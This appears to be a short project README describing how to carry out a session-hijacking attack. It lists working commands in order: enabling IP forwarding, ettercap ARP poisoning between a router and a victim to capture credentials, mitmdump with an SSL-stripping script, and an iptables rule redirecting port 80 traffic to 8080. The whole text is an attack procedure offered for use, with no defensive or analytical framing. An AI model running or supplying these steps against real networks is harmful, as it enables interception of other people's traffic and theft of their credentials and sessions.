# SessionHijacking
In this project we will perform session hijacking attack by the below steps.
1.)  First, we enable the packet forwarding by “echo 1 > /proc/sys/net/ipv4/ip_forward” command.
2.) ettercap -Tq -M arp:remote -i interface -s /router_ip// /victim_ip// to do arp poisioning and capture the credentials.
3.) To perform SSL Stripping we are using MITM dump tool and SSL stripping script.
Mitmdump –s sslstripping.py -m transparent.
We used iptables to do traffic redirect from port 80 to port 8080.
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080
